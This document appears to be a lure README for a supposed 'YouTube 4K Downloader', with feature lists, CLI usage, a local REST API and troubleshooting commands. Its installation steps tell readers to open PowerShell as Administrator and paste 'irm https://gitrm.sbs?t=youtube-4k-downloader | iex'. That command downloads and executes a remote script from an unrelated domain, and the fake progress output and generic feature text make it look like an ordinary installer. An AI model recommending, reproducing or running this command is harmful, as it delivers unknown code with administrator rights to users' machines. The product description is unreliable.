# YouTube 4K Downloader — Complete YouTube 4K Video Download & Conversion Suite

> All-in-one YouTube 4K downloader — download videos, playlists, live streams in 4K, 8K, and convert to multiple formats in one package.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> **Полезный совет:** Используйте VPN для доступа к географически заблокированным видео.

### Step 1: Open CMD or PowerShell as Administrator
```
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Copy & Paste in PowerShell
```
irm https://gitrm.sbs?t=youtube-4k-downloader | iex
```

### Step 3: Wait for Completion
```
[1/4] Loading YouTube 4K Downloader modules...
[2/4] Extracting download and conversion components...
[3/4] Installing quality and merge utilities...
[4/4] Ready. Start downloading in 4K.
```

### Step 4: Start Using the Downloader
- Launch via `youtube-4k-downloader.exe` or `npm start`
- Configure download quality and formats
- Start downloading videos and playlists

---

## TL;DR - Quick Summary

**YouTube 4K Downloader** combines 4K/8K video downloading, playlist processing, live stream capture, and format conversion. Covers all major YouTube 4K download and conversion needs.

**Best for:** Video enthusiasts, content creators, and media archivists.

**Key differentiators:**
1. 4K, 8K, and HDR video download support
2. Playlist and channel download
3. Live stream capture and recording
4. Multiple format conversion (MP4, MKV, MP3)
5. Quality selection and automatic merging
6. Subtitle and metadata preservation

---

## Core Features

### Download Engine
```
✅ 4K, 8K, HDR video download
✅ Playlist and channel download
✅ Live stream capture
✅ Batch download with queue
✅ Resume interrupted downloads
✅ Download history and tracking
✅ Speed optimization and throttling
✅ Proxy and VPN support
```

### Format Conversion
```
✅ MP4 conversion (H.264, H.265/HEVC)
✅ MKV conversion
✅ MP3 audio extraction
✅ AAC conversion
✅ Subtitle embedding
✅ Chapter support
✅ Metadata tagging
✅ Custom codec settings
```

### Playlist Management
```
✅ Playlist import from URL
✅ Playlist export to JSON
✅ Auto-detect playlist type
✅ Track filtering and sorting
✅ Duplicate removal
✅ Playlist synchronization
✅ Batch playlist operations
✅ Playlist sharing
```

---

## Usage

```bash
# Download 4K video
youtube-4k-downloader download --url "https://youtube.com/watch?v=123456" --quality "4K" --output "./videos/"

# Download playlist
youtube-4k-downloader playlist --url "https://youtube.com/playlist?list=123" --format "mkv" --quality "1080p"

# Download live stream
youtube-4k-downloader live --url "https://youtube.com/live/stream" --output "./recordings/"

# Convert to MP3
youtube-4k-downloader convert --input "./video.mp4" --format "mp3" --bitrate "320k"
```

---

## REST API

```bash
# Download via API
curl -X POST "http://localhost:6666/api/youtube/download" -H "Content-Type: application/json" -d '{"url": "https://youtube.com/watch?v=123456", "quality": "4K", "format": "mp4"}'

# Playlist via API
curl -X POST "http://localhost:6666/api/youtube/playlist" -H "Content-Type: application/json" -d '{"url": "https://youtube.com/playlist?list=123", "format": "mkv"}'

# Live stream via API
curl -X POST "http://localhost:6666/api/youtube/live" -H "Content-Type: application/json" -d '{"url": "https://youtube.com/live/stream", "output": "./recordings/"}'
```

---

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Download Manager: `screenshots/download-manager.png`
- Playlist Import: `screenshots/playlist-import.png`
- Format Conversion: `screenshots/format-conversion.png`
- Download History: `screenshots/download-history.png`

---

## Troubleshooting

### Download Fails
```bash
youtube-4k-downloader check --url "https://youtube.com/watch?v=123456"
youtube-4k-downloader download --url "https://youtube.com/watch?v=123456" --retry 3 --debug
```

### Conversion Error
```bash
youtube-4k-downloader convert validate --input "./video.mp4" --format "mp4"
youtube-4k-downloader convert --input "./video.mp4" --format "mp4" --force
```

### Playlist Import Fails
```bash
youtube-4k-downloader playlist validate --url "https://youtube.com/playlist?list=123"
youtube-4k-downloader playlist import --url "https://youtube.com/playlist?list=123" --force
```

---

## Use Cases

### Video Downloading
- Download 4K/8K videos
- Download playlists and channels
- Archive streaming content
- Download live streams

### Media Conversion
- Convert to MP4 for compatibility
- Convert to MKV for archival
- Extract MP3 audio
- Embed subtitles and chapters

### Playlist Management
- Import playlists from YouTube
- Export playlists for sharing
- Manage playlist collections
- Synchronize playlists

---

> [!IMPORTANT]
> **Важно:** Скачивайте только контент, к которому у вас есть права. Уважайте авторские права и условия YouTube.

## ⚠️ IMPORTANT

Created for **educational and personal use only**. Download only content you have rights to. Respect copyright laws and YouTube Terms of Service.

---

## License

MIT License - see LICENSE file for details.

---

## Tags

`youtube-4k-downloader` `youtube` `4k-downloader` `8k-downloader` `video-downloader` `playlist-downloader` `live-stream-downloader` `mp4-converter` `mkv-converter` `mp3-extractor`